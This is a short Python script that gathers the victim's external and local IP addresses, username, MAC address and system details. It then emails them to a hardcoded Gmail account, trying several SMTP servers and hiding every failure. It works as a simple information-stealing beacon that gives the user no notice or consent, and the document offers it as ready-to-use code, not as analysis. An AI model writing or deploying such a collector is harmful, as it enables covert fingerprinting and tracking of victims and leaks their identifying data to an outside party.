import bs4, requests, os, socket
import smtplib as sm
import getpass, platform, uuid
import tkinter as tk

res = requests.get('https://2ip.ua/ru/')

content = bs4.BeautifulSoup(res.text, "html.parser")

ip_ex = content.select(" .ipblockgradient .ip")[0].getText()

ip_local = socket.gethostbyname(socket.getfqdn())

name = getpass.getuser()

mac = hex(uuid.getnode())

pltfrm = platform.uname()

message = '''
ip_ex: {}
ip_local: {}
user_name: {}
mac: {}
platform: {}'''.format(ip_ex, ip_local, name, mac, pltfrm)

def send_email(message):
    sender = 'gmail_of_sender'
    password = 'password'

    try:
        server = sm.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender, password)
        server.sendmail(sender, sender, message)
        server.quit()
    except:
        try:
            server = sm.SMTP("smtp.gmail.com", 465)
            server.starttls()
            server.login(sender, password)
            server.sendmail(sender, sender, message)
            server.quit()
        except:
            try:
                server = sm.SMTP('74.125.28.108')
                server.starttls()
                server.login(sender, password)
                server.sendmail(sender, sender, message)
                server.quit()
            except:
                None



send_email(message=message)